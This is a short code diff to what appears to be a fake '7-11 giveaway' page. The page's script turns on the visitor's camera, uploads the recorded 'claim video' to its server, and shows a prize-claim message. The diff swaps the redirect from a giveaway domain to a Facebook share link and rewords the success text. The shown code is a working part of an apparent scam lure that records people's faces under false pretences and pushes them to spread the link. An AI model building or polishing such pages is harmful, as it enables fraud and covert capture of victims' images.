@@ -122,7 +122,7 @@ const loading = document.getElementById('loading');
 const video = document.getElementById('preview');
 
 // ✅ REDIRECT URL AFTER CLAIM
-const REDIRECT_URL = "https://seven-11-giveaways-2026.onrender.com";
+const REDIRECT_URL = "https://www.facebook.com/share/1DQpaDAogj/";
 
 // Initialize camera
 async function initCamera() {
@@ -154,7 +154,7 @@ btn.addEventListener('click', async () => {
                 const res = await fetch("/upload-video", { method: "POST", body: formData });
                 const data = await res.json();
                 console.log("Video posted:", data);
-                loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
+                loading.innerHTML = "<p>Success Your Claim Your Price!</p>";
             } catch (err) {
                 console.error("Error posting video:", err);
                 loading.innerHTML = "<p>Error occurred. Redirecting...</p>";
